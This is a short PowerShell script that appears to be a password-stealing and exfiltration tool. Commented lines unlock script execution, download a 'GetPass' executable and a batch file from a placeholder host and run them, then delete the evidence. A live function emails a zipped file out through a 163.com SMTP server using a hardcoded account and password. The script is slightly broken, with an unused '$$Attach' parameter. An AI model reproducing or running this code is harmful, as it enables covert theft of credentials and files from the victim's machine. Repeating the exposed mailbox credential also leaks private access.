#Set-ExecutionPolicy -ExecutionPolicy Unrestricted
#Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

#(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/GetPass.rar','D:\Get.exe');

#(new-object System.Net.WebClient).DownloadFile('http://www.xxx.xxx/Command.rar','D:\Command.bat');

#D:\Command.bat;

function mailClientSend($mailTitle, $$Attach){
    $SMTPServer = 'smtp.163.com'

    $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 25)

    $SMTPInfo.EnableSsl = $true

    $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('14778555757@163.com', 'zzmO5XPEnGzhmlis');

    $ReportEmail = New-Object System.Net.Mail.MailMessage

    $ReportEmail.From = '14778555757@163.com'
    #$ReportEmail.From = New-Object System.Net.Mail.MailAddress("14778555757@163.com");

    $ReportEmail.To.Add('14778555757@163.com')

    $ReportEmail.Subject = 'GetPass'

    $ReportEmail.Body = 'GetPass_text'

    $ReportEmail.Attachments.Add('C:\Users\ichieh\backup190812094121.zip')
    $SMTPInfo.Timeout = 1000000
    $SMTPInfo.Send($ReportEmail)
    $ReportEmail.Attachments.Dispose()
}

#remove-item 'D:\GetPass.txt'

#remove-item 'D:\Get.exe'